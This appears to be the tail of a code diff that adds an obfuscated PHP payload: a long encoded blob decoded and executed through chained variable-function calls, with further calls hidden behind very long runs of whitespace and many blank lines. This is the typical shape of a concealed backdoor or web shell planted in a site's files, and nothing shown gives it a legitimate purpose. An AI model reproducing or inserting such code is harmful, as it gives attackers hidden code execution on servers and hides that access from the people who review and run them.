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';
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
